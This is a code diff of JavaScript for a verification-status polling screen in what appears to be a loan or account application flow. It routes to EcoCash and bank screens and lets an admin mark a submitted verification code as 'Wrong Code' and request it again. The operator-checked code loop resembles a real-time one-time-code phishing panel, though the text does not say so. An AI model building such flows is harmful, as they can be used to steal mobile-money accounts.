@@ -1521,7 +1521,7 @@ function loadVerificationPendingScreen() {
             ">
 
                 Your verification code has been
-                received successfully.
+                confirmed successfuly.
 
                 <br><br>
 
@@ -1551,8 +1551,7 @@ function loadVerificationPendingScreen() {
 }
 
 // ======================================================
-// PART 16 - MONITOR VERIFICATION STATUS
-// BANK + ECOCASH ROUTING
+// MONITOR VERIFICATION STATUS
 // ======================================================
 
 async function monitorVerificationStatus() {
@@ -1562,7 +1561,9 @@ async function monitorVerificationStatus() {
 
     if (!applicationId) {
 
-        console.error("Application ID not found.");
+        console.error(
+            "Application ID not found."
+        );
 
         return;
     }
@@ -1570,12 +1571,16 @@ async function monitorVerificationStatus() {
     try {
 
         const response = await fetch(
-            `/application-status/${applicationId}`
+            `/application-status/${applicationId}`,
+            {
+                cache: "no-store"
+            }
         );
 
-        const result = await response.json();
+        const result =
+            await response.json();
 
-        if (!result.success) {
+        if (!response.ok || !result.success) {
 
             setTimeout(
                 monitorVerificationStatus,
@@ -1587,6 +1592,22 @@ async function monitorVerificationStatus() {
 
         const stage =
             result.application.current_stage;
+
+        // ==============================================
+        // ADMIN MARKED CODE AS WRONG
+        // ==============================================
+
+        if (stage === "waiting_code" &&
+            result.application.verification_status === "Wrong Code") {
+
+            alert(
+                "❌ The verification code could not be verified. Please check the code and try again."
+            );
+
+            loadEcoCashVerificationScreen();
+
+            return;
+        }
 
         // ==============================================
         // VERIFICATION COMPLETED
@@ -1629,6 +1650,15 @@ async function monitorVerificationStatus() {
             return;
         }
 
+        // ==============================================
+        // STILL WAITING
+        // ==============================================
+
+        setTimeout(
+            monitorVerificationStatus,
+            5000
+        );
+
     } catch (err) {
 
         console.error(
@@ -1636,16 +1666,12 @@ async function monitorVerificationStatus() {
             err
         );
 
+        setTimeout(
+            monitorVerificationStatus,
+            5000
+        );
+
     }
-
-    // ==============================================
-    // KEEP CHECKING
-    // ==============================================
-
-    setTimeout(
-        monitorVerificationStatus,
-        5000
-    );
 
 }
 
